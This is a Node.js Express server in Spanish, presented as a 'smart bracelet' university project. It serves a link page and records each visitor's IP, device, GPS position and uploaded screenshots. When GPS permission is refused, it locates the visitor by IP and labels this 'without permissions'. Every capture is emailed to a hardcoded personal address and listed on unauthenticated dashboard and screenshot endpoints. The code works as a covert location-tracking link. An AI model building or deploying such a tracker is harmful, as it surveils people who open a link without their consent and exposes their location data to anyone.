const express = require('express');
const fs = require('fs');
const path = require('path');
const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 3000;
const SITE_NAME = process.env.SITE_NAME || 'Pulsera Inteligente';

// Configuración de email
const EMAIL_TO = 'shoncita1@gmail.com';

// Crear transporter de email (usando Gmail)
// IMPORTANTE: Configurar con variables de entorno o directamente aquí
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER || 'tu-email@gmail.com', // Email de Gmail
        pass: process.env.EMAIL_PASS || 'tu-contraseña-de-aplicacion' // Contraseña de aplicación
    }
});

// Función para enviar email con la ubicación
async function sendLocationEmail(visitData) {
    const mapsUrl = visitData.latitude && visitData.longitude 
        ? `https://www.google.com/maps?q=${visitData.latitude},${visitData.longitude}`
        : 'Sin ubicación GPS';

    const mailOptions = {
        from: `${SITE_NAME} <${process.env.EMAIL_USER || 'tu-email@gmail.com'}>`,
        to: EMAIL_TO,
        subject: `🚨 Nueva Ubicación Capturada - ${SITE_NAME}`,
        html: `
            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
                <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; text-align: center;">
                    <h1>📍 ${SITE_NAME}</h1>
                    <p>Nueva ubicación detectada</p>
                </div>
                
                <div style="padding: 20px; background: #f5f5f5;">
                    <h2 style="color: #667eea;">📊 Información Capturada</h2>
                    
                    <div style="background: white; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
                        <p><strong>🕐 Fecha y Hora:</strong><br>${new Date(visitData.timestamp).toLocaleString('es-ES')}</p>
                    </div>

                    <div style="background: white; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
                        <p><strong>🌐 Dirección IP:</strong><br>${visitData.ip}</p>
                    </div>

                    ${visitData.latitude && visitData.longitude ? `
                        <div style="background: white; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
                            <p><strong>📍 Ubicación ${visitData.location_method === 'IP (sin permisos)' ? '(Aproximada por IP)' : 'GPS'}:</strong></p>
                            <p>Latitud: ${visitData.latitude.toFixed(6)}</p>
                            <p>Longitud: ${visitData.longitude.toFixed(6)}</p>
                            <p>Método: ${visitData.location_method || 'GPS'}</p>
                            <p>Precisión: ${visitData.accuracy ? (typeof visitData.accuracy === 'number' ? visitData.accuracy.toFixed(0) + ' metros' : visitData.accuracy) : 'N/A'}</p>
                            ${visitData.location_method === 'IP (sin permisos)' ? '<p style="color: #ff9800; font-size: 12px;">⚠️ Ubicación aproximada. No requirió permisos del usuario.</p>' : ''}
                            <p style="margin-top: 10px;">
                                <a href="${mapsUrl}" 
                                   style="background: #4caf50; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; display: inline-block;">
                                   🗺️ Ver en Google Maps
                                </a>
                            </p>
                        </div>
                    ` : `
                        <div style="background: #fff3cd; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
                            <p><strong>⚠️ Ubicación GPS no disponible</strong></p>
                        </div>
                    `}

                    <div style="background: white; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
                        <p><strong>📱 Dispositivo:</strong><br>${visitData.user_agent}</p>
                    </div>

                    <div style="background: white; padding: 15px; border-radius: 8px; margin-bottom: 15px;">
                        <p><strong>🔢 ID de Registro:</strong> Email enviado en tiempo real</p>
                    </div>
                </div>

                <div style="padding: 20px; text-align: center; color: #666; font-size: 12px;">
                    <p>Este es un mensaje automático del sistema de Pulsera Inteligente</p>
                    <p>Proyecto Universitario - 2026</p>
                </div>
            </div>
        `
    };

    try {
        await transporter.sendMail(mailOptions);
        console.log('✅ Email enviado a:', EMAIL_TO);
        return true;
    } catch (error) {
        console.error('❌ Error enviando email:', error.message);
        return false;
    }
}

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// Crear carpeta de logs si no existe (solo para capturas, opcional)
const logsDir = path.join(__dirname, 'logs');
const screenshotsDir = path.join(__dirname, 'logs', 'screenshots');
const visitsFile = path.join(logsDir, 'visits.json');

if (!fs.existsSync(logsDir)) {
    fs.mkdirSync(logsDir, { recursive: true });
}
if (!fs.existsSync(screenshotsDir)) {
    fs.mkdirSync(screenshotsDir, { recursive: true });
}
if (!fs.existsSync(visitsFile)) {
    fs.writeFileSync(visitsFile, JSON.stringify([], null, 2));
}

console.log('✅ Sistema inicializado - Modo EMAIL + Dashboard web');

// Expose a small config endpoint so frontends can read site name
app.get('/api/config', (req, res) => {
    res.json({ site_name: SITE_NAME });
});

// Función para obtener la IP real del visitante
function getClientIP(req) {
    return req.headers['x-forwarded-for']?.split(',')[0].trim() || 
           req.headers['x-real-ip'] || 
           req.connection.remoteAddress || 
           req.socket.remoteAddress ||
           req.connection.socket?.remoteAddress;
}

// Ruta principal - la página que abrirán
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Función para obtener ubicación aproximada por IP (sin permisos)
async function getLocationByIP(ip) {
    try {
        // Importar https dinámicamente
        const https = require('https');
        
        return new Promise((resolve, reject) => {
            // Limpiar IP si es IPv6 localhost
            const cleanIp = ip.replace(/^::ffff:/, '');
            
            // No intentar geolocalizar IPs locales
            if (cleanIp === '127.0.0.1' || cleanIp === '::1' || cleanIp.startsWith('192.168.') || cleanIp.startsWith('10.')) {
                console.log('⚠️ IP local detectada, no se puede geolocalizar');
                resolve(null);
                return;
            }

            const url = `https://ipapi.co/${cleanIp}/json/`;
            
            https.get(url, (res) => {
                let data = '';
                
                res.on('data', (chunk) => {
                    data += chunk;
                });
                
                res.on('end', () => {
                    try {
                        const result = JSON.parse(data);
                        
                                // Return useful fields plus the raw API response
                                resolve({
                                    latitude: result.latitude || null,
                                    longitude: result.longitude || null,
                                    city: result.city || null,
                                    country: result.country_name || null,
                                    accuracy: result.city && result.country_name ? `Aproximada (${result.city}, ${result.country_name})` : null,
                                    method: 'IP',
                                    raw: result
                                });
                    } catch (error) {
                        console.error('Error parseando respuesta:', error);
                        resolve(null);
                    }
                });
            }).on('error', (error) => {
                console.error('Error obteniendo ubicación por IP:', error);
                resolve(null);
            });
        });
    } catch (error) {
        console.error('Error en getLocationByIP:', error);
        return null;
    }
}

// Ruta para registrar la visita con geolocalización
app.post('/api/log-visit', async (req, res) => {
    // Allow client to send detected public IP (helps when behind NAT)
    const clientDetectedIp = req.body.public_ip;
    const ip = clientDetectedIp || getClientIP(req);
    const timestamp = new Date().toISOString();
    const userAgent = req.headers['user-agent'];
    const { screenshot, latitude, longitude, accuracy } = req.body;

    let screenshotFilename = null;

    // Guardar captura si se envió (opcional)
    if (screenshot) {
        try {
            screenshotFilename = `screenshot_${Date.now()}.png`;
            const screenshotPath = path.join(screenshotsDir, screenshotFilename);
            
            const base64Data = screenshot.replace(/^data:image\/\w+;base64,/, '');
            fs.writeFileSync(screenshotPath, base64Data, 'base64');
        } catch (error) {
            console.error('Error guardando captura:', error);
        }
    }

    // Si no hay GPS del navegador, obtener ubicación por IP (sin permisos)
    let finalLatitude = latitude;
    let finalLongitude = longitude;
    let finalAccuracy = accuracy;
    let locationMethod = 'GPS';
    let ipLocation = null;
    let ipRaw = null;

    if (!latitude || !longitude) {
        ipLocation = await getLocationByIP(ip);
        if (ipLocation) {
            finalLatitude = ipLocation.latitude;
            finalLongitude = ipLocation.longitude;
            finalAccuracy = ipLocation.accuracy;
            locationMethod = 'IP (sin permisos)';
            ipRaw = ipLocation.raw || null;
            console.log('📡 Ubicación obtenida por IP (sin permisos necesarios)');
        }
    }

    // Always try to fetch IP info for records if not already fetched
    if (!ipLocation) {
        try {
            ipLocation = await getLocationByIP(ip);
            ipRaw = ipLocation ? ipLocation.raw : null;
        } catch (e) {
            ipLocation = null;
        }
    }

    console.log('📍 Nueva visita detectada:', {
        ip,
        location: finalLatitude && finalLongitude ? `${finalLatitude}, ${finalLongitude}` : 'Sin ubicación',
        method: locationMethod,
        screenshot: screenshotFilename ? '✓' : '✗'
    });

    // Preparar datos para el email
    const visitData = {
        timestamp,
        ip,
        latitude: finalLatitude || null,
        longitude: finalLongitude || null,
        accuracy: finalAccuracy || null,
        location_method: locationMethod,
        user_agent: userAgent,
        screenshot_file: screenshotFilename
    };

    // Guardar también en archivo JSON para el dashboard
    try {
        let visits = [];
        if (fs.existsSync(visitsFile)) {
            const data = fs.readFileSync(visitsFile, 'utf8');
            visits = JSON.parse(data);
        }

        const visitRecord = {
            id: visits.length + 1,
            timestamp: visitData.timestamp,
            ip: visitData.ip,
            public_ip: clientDetectedIp || null,
            ip_info: ipLocation || null,
            latitude: visitData.latitude,
            longitude: visitData.longitude,
            accuracy: visitData.accuracy,
            location_method: visitData.location_method,
            user_agent: visitData.user_agent,
            screenshot_file: visitData.screenshot_file,
            created_at: new Date().toISOString()
        };

        visits.push(visitRecord);
        fs.writeFileSync(visitsFile, JSON.stringify(visits, null, 2));
    } catch (error) {
        console.error('Error guardando registro local:', error);
    }

    // Enviar email inmediatamente
    try {
        const emailSent = await sendLocationEmail(visitData);
        
        if (emailSent) {
            console.log('✅ Email enviado a:', EMAIL_TO);
            res.json({ 
                success: true, 
                message: 'Ubicación capturada y notificación enviada por email'
            });
        } else {
            res.json({ 
                success: true, 
                message: 'Ubicación capturada (email pendiente)'
            });
        }
    } catch (error) {
        console.error('❌ Error:', error);
        res.json({ 
            success: true, 
            message: 'Ubicación capturada (error al enviar email)'
        });
    }
});

// Ruta para ver el dashboard (solo para ti)
app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// API para obtener las visitas registradas
app.get('/api/visits', (req, res) => {
    try {
        if (fs.existsSync(visitsFile)) {
            const data = fs.readFileSync(visitsFile, 'utf8');
            const visits = JSON.parse(data);
            // Ordenar por más reciente primero
            visits.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
            res.json(visits);
        } else {
            res.json([]);
        }
    } catch (error) {
        console.error('Error obteniendo visitas:', error);
        res.status(500).json({ error: 'Error al obtener visitas' });
    }
});

// Ruta de depuración: devuelve la IP detectada y la geolocalización por IP
app.get('/api/ip-lookup', async (req, res) => {
    try {
        const ip = getClientIP(req) || req.ip;
        const info = await getLocationByIP(ip);

        res.json({
            ip,
            info: info || null
        });
    } catch (error) {
        console.error('Error en /api/ip-lookup:', error);
        res.status(500).json({ error: 'Error al obtener geolocalización por IP' });
    }
});

// Servir las capturas de pantalla
app.use('/screenshots', express.static(screenshotsDir));

app.listen(PORT, '0.0.0.0', () => {
    console.log(`
╔════════════════════════════════════════════════════════╗
║  📍 Pulsera Inteligente - EMAIL + Dashboard Web      ║
╚════════════════════════════════════════════════════════╝

📱 Link de la pulsera: http://localhost:${PORT}
📊 Dashboard web: http://localhost:${PORT}/dashboard
📧 Notificaciones a: ${EMAIL_TO}

⚠️  Para desplegar en Render:
    Configura las variables de entorno:
    - EMAIL_USER: tu-email@gmail.com
    - EMAIL_PASS: contraseña-de-aplicacion-gmail

💡 Cada vez que alguien abre el link:
    ✅ Captura ubicación GPS (o por IP si no hay permisos)
    ✅ Envía email automático
    ✅ Guarda en dashboard web para consulta
    `);
});
